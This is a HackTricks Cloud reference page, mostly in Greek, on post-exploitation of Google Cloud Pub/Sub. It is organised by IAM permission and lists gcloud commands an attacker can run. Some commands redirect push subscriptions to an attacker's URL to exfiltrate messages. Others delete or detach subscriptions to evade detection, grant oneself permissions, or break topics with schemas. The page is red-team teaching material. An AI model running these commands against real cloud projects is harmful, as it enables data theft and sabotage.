# GCP - Pub/Sub Post Exploitation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Pub/Sub

Για περισσότερες πληροφορίες σχετικά με το Pub/Sub, ελέγξτε την παρακάτω σελίδα:

{% content-ref url="../gcp-services/gcp-pub-sub.md" %}
[gcp-pub-sub.md](../gcp-services/gcp-pub-sub.md)
{% endcontent-ref %}

### `pubsub.topics.publish`

Δημοσιεύστε ένα μήνυμα σε ένα θέμα, χρήσιμο για **να στείλετε απροσδόκητα δεδομένα** και να ενεργοποιήσετε απροσδόκητες λειτουργίες ή να εκμεταλλευτείτε ευπάθειες:
```bash
# Publish a message in a topic
gcloud pubsub topics publish <topic_name> --message "Hello!"
```
### `pubsub.topics.detachSubscription`

Χρήσιμο για να αποτρέψει μια συνδρομή από το να λαμβάνει μηνύματα, ίσως για να αποφευχθεί η ανίχνευση.
```bash
gcloud pubsub topics detach-subscription <FULL SUBSCRIPTION NAME>
```
### `pubsub.topics.delete`

Χρήσιμο για να αποτρέψει μια συνδρομή από το να λαμβάνει μηνύματα, ίσως για να αποφευχθεί η ανίχνευση.\
Είναι δυνατόν να διαγραφεί ένα θέμα ακόμη και με συνδρομές συνδεδεμένες σε αυτό.
```bash
gcloud pubsub topics delete <TOPIC NAME>
```
### `pubsub.topics.update`

Χρησιμοποιήστε αυτήν την άδεια για να ενημερώσετε κάποιες ρυθμίσεις του θέματος για να το διαταράξετε, όπως `--clear-schema-settings`, `--message-retention-duration`, `--message-storage-policy-allowed-regions`, `--schema`, `--schema-project`, `--topic-encryption-key`...

### `pubsub.topics.setIamPolicy`

Δώστε στον εαυτό σας άδεια να εκτελέσει οποιαδήποτε από τις προηγούμενες επιθέσεις.

### **`pubsub.subscriptions.create,`**`pubsub.topics.attachSubscription` , (`pubsub.subscriptions.consume`)

Αποκτήστε όλα τα μηνύματα σε έναν διακομιστή ιστού:

{% code overflow="wrap" %}
```bash
# Crete push subscription and recieve all the messages instantly in your web server
gcloud pubsub subscriptions create <subscription name> --topic <topic name> --push-endpoint https://<URL to push to>
```
{% endcode %}

Δημιουργήστε μια συνδρομή και χρησιμοποιήστε την για να **τραβήξετε μηνύματα**:
```bash
# This will retrive a non ACKed message (and won't ACK it)
gcloud pubsub subscriptions create <subscription name> --topic <topic_name>

# You also need pubsub.subscriptions.consume for this
gcloud pubsub subscriptions pull <FULL SUBSCRIPTION NAME>
## This command will wait for a message to be posted
```
### `pubsub.subscriptions.delete`

**Η διαγραφή μιας συνδρομής** θα μπορούσε να είναι χρήσιμη για να διαταράξει ένα σύστημα επεξεργασίας καταγραφών ή κάτι παρόμοιο:
```bash
gcloud pubsub subscriptions delete <FULL SUBSCRIPTION NAME>
```
### `pubsub.subscriptions.update`

Χρησιμοποιήστε αυτή την άδεια για να ενημερώσετε κάποιες ρυθμίσεις ώστε τα μηνύματα να αποθηκεύονται σε ένα μέρος που μπορείτε να έχετε πρόσβαση (URL, πίνακας Big Query, Bucket) ή απλώς για να το διαταράξετε.

{% code overflow="wrap" %}
```bash
gcloud pubsub subscriptions update --push-endpoint <your URL> <subscription-name>
```
{% endcode %}

### `pubsub.subscriptions.setIamPolicy`

Δώστε στον εαυτό σας τις άδειες που χρειάζεστε για να εκτελέσετε οποιαδήποτε από τις προηγουμένως σχολιασμένες επιθέσεις.

### `pubsub.schemas.attach`, `pubsub.topics.update`,(`pubsub.schemas.create`)

Επιτεθείτε σε ένα σχήμα σε ένα θέμα ώστε τα μηνύματα να μην το πληρούν και επομένως το θέμα να διαταραχθεί.\
Αν δεν υπάρχουν σχήματα, ίσως χρειαστεί να δημιουργήσετε ένα.

{% code title="schema.json" %}
```json
{
"namespace": "com.example",
"type": "record",
"name": "Person",
"fields": [
{
"name": "name",
"type": "string"
},
{
"name": "age",
"type": "int"
}
]
}
```
{% endcode %}
```bash
# Attach new schema
gcloud pubsub topics update projects/<project-name>/topics/<topic-id> \
--schema=projects/<project-name>/schemas/<topic-id> \
--message-encoding=json
```
### `pubsub.schemas.delete`

Αυτό μπορεί να φαίνεται σαν να διαγράφετε ένα σχήμα, αλλά θα μπορείτε να στείλετε μηνύματα που δεν πληρούν το σχήμα. Ωστόσο, καθώς το σχήμα θα διαγραφεί, κανένα μήνυμα δεν θα εισέλθει πραγματικά μέσα στο θέμα. Έτσι, αυτό είναι **ΑΧΡΗΣΤΟ**:
```bash
gcloud pubsub schemas delete <SCHEMA NAME>
```
### `pubsub.schemas.setIamPolicy`

Δώστε στον εαυτό σας τις άδειες που χρειάζεστε για να εκτελέσετε οποιαδήποτε από τις προηγουμένως σχολιασμένες επιθέσεις.

### `pubsub.snapshots.create`, `pubsub.snapshots.seek`

Αυτό θα δημιουργήσει ένα στιγμιότυπο όλων των μηνυμάτων που δεν έχουν επιβεβαιωθεί και θα τα επιστρέψει στη συνδρομή. Όχι πολύ χρήσιμο για έναν επιτιθέμενο, αλλά εδώ είναι:
```bash
gcloud pubsub snapshots create YOUR_SNAPSHOT_NAME \
--subscription=YOUR_SUBSCRIPTION_NAME
gcloud pubsub subscriptions seek YOUR_SUBSCRIPTION_NAME \
--snapshot=YOUR_SNAPSHOT_NAME
```
{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
